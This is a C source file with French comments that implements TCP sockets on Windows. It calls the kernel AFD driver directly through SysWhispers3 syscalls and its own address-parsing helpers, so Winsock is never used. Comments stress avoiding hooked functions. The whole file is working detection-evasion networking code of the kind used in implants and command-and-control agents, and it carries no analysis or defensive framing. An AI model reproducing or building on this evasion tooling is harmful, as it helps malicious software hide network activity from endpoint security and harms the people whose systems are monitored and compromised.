/*
 * afd.c - AFD driver syscall-based sockets
 * Communication directe avec le driver AFD du noyau Windows via syscalls
 */

#include "afd.h"
#include "../types.h"
#include <string.h>

// Include syscalls de SysWhispers3
// Note: syscalls.c doit être compilé sur Windows (problème d'inline asm en cross-compilation)
#include "../../syscalls/syscalls.h"

// Helper pour RtlInitUnicodeString (fonction ntdll, pas hookée)
typedef void (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

static RtlInitUnicodeString_t pRtlInitUnicodeString = NULL;

// Initialiser le pointeur vers RtlInitUnicodeString
static void init_rtl_functions(void) {
    if (pRtlInitUnicodeString == NULL) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            // Supprimer le warning de cast (c'est sûr car on connaît la signature)
            #pragma GCC diagnostic push
            #pragma GCC diagnostic ignored "-Wcast-function-type"
            pRtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hNtdll, "RtlInitUnicodeString");
            #pragma GCC diagnostic pop
        }
    }
}

// ═══════════════════════════════════════════════════════════════
// Fonctions AFD Socket
// ═══════════════════════════════════════════════════════════════

// Créer un socket AFD en ouvrant \Device\Afd\Endpoint
HANDLE afd_socket_create(void) {
    HANDLE hAfd = NULL;
    UNICODE_STRING afdDevice;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK iosb;
    NTSTATUS status;

    init_rtl_functions();
    if (pRtlInitUnicodeString == NULL) {
        return NULL;
    }

    // Initialiser le nom du device AFD
    pRtlInitUnicodeString(&afdDevice, L"\\Device\\Afd\\Endpoint");

    // Initialiser les attributs de l'objet
    InitializeObjectAttributes(&objAttr, &afdDevice, 0, NULL, NULL);

    // Créer le fichier (socket AFD)
    status = Sw3NtCreateFile(
        &hAfd,
        GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
        &objAttr,
        &iosb,
        NULL,                           // AllocationSize
        0,                              // FileAttributes
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN_IF,                   // CreateDisposition
        0,                              // CreateOptions
        NULL,                           // EaBuffer
        0                               // EaLength
    );

    if (!NT_SUCCESS(status)) {
        return NULL;
    }

    return hAfd;
}

// Se connecter au serveur via AFD
int afd_connect(HANDLE hAfd, const char* ip, unsigned short port) {
    IO_STATUS_BLOCK iosb;
    AFD_SOCKADDR_IN addr;
    NTSTATUS status;

    if (hAfd == NULL || ip == NULL) {
        return 0;
    }

    // Préparer la structure sockaddr
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = custom_htons(port);
    addr.sin_addr = custom_inet_addr(ip);

    // Appeler IOCTL_AFD_CONNECT
    status = Sw3NtDeviceIoControlFile(
        hAfd,
        NULL,                   // Event
        NULL,                   // ApcRoutine
        NULL,                   // ApcContext
        &iosb,
        IOCTL_AFD_CONNECT,
        &addr,                  // InputBuffer
        sizeof(addr),           // InputBufferLength
        NULL,                   // OutputBuffer
        0                       // OutputBufferLength
    );

    if (!NT_SUCCESS(status)) {
        return 0;
    }

    return 1;
}

// Envoyer des données via AFD
int afd_send(HANDLE hAfd, const char* data, int len) {
    IO_STATUS_BLOCK iosb;
    AFD_WSABUF wsabuf;
    AFD_SEND_INFO sendInfo;
    NTSTATUS status;

    if (hAfd == NULL || data == NULL || len <= 0) {
        return -1;
    }

    // Préparer le buffer
    wsabuf.buf = (PCHAR)data;
    wsabuf.len = (ULONG)len;

    // Préparer les infos d'envoi
    sendInfo.BufferArray = &wsabuf;
    sendInfo.BufferCount = 1;
    sendInfo.AfdFlags = 0;
    sendInfo.TdiFlags = 0;

    // Appeler IOCTL_AFD_SEND
    status = Sw3NtDeviceIoControlFile(
        hAfd,
        NULL,                   // Event
        NULL,                   // ApcRoutine
        NULL,                   // ApcContext
        &iosb,
        IOCTL_AFD_SEND,
        &sendInfo,              // InputBuffer
        sizeof(sendInfo),       // InputBufferLength
        NULL,                   // OutputBuffer
        0                       // OutputBufferLength
    );

    if (!NT_SUCCESS(status)) {
        return -1;
    }

    // Retourner le nombre d'octets envoyés
    return (int)iosb.Information;
}

// Recevoir des données via AFD
int afd_recv(HANDLE hAfd, char* buffer, int buflen) {
    IO_STATUS_BLOCK iosb;
    AFD_WSABUF wsabuf;
    AFD_RECV_INFO recvInfo;
    NTSTATUS status;

    if (hAfd == NULL || buffer == NULL || buflen <= 0) {
        return -1;
    }

    // Préparer le buffer
    wsabuf.buf = buffer;
    wsabuf.len = (ULONG)buflen;

    // Préparer les infos de réception
    recvInfo.BufferArray = &wsabuf;
    recvInfo.BufferCount = 1;
    recvInfo.AfdFlags = AFD_OVERLAPPED;
    recvInfo.TdiFlags = TDI_RECEIVE_NORMAL;

    // Appeler IOCTL_AFD_RECV
    status = Sw3NtDeviceIoControlFile(
        hAfd,
        NULL,                   // Event
        NULL,                   // ApcRoutine
        NULL,                   // ApcContext
        &iosb,
        IOCTL_AFD_RECV,
        &recvInfo,              // InputBuffer
        sizeof(recvInfo),       // InputBufferLength
        NULL,                   // OutputBuffer
        0                       // OutputBufferLength
    );

    if (!NT_SUCCESS(status)) {
        return -1;
    }

    // Retourner le nombre d'octets reçus
    return (int)iosb.Information;
}

// Fermer le socket AFD
void afd_close(HANDLE hAfd) {
    if (hAfd != NULL) {
        Sw3NtClose(hAfd);
    }
}

// ═══════════════════════════════════════════════════════════════
// Fonctions Helper (sans dépendances ws2_32.dll)
// ═══════════════════════════════════════════════════════════════

// Parser "192.168.18.24" → 0x1812A8C0 (little-endian/network byte order)
unsigned long custom_inet_addr(const char* ip) {
    int parts[4] = {0};
    int i = 0;

    if (ip == NULL) {
        return 0;
    }

    // Parser manuellement "192.168.18.24"
    while (*ip && i < 4) {
        if (*ip >= '0' && *ip <= '9') {
            parts[i] = parts[i] * 10 + (*ip - '0');
        } else if (*ip == '.') {
            i++;
        }
        ip++;
    }

    // Construire l'adresse en little-endian (format réseau)
    // 192.168.18.24 → 0x1812A8C0
    return (parts[0]) | (parts[1] << 8) | (parts[2] << 16) | (parts[3] << 24);
}

// Host to network byte order (big-endian)
// Convertir port en format réseau
unsigned short custom_htons(unsigned short hostshort) {
    return ((hostshort & 0x00FF) << 8) | ((hostshort & 0xFF00) >> 8);
}
